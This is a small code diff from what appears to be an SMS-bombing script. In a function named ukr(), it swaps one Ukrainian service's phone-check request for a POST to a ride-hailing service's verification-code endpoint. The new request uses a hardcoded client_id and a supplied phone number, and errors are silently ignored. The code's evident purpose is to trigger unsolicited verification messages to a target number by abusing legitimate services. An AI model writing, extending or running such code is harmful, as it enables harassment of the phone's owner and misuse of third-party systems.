@@ -53,7 +53,7 @@ def ukr():
                 except:
                         pass
                 try:
-                         requests.post("https://auth.easypay.ua/api/check", json={"phone": "+" + number}, headers=headers)
+                         requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
                 except:
                         pass
 
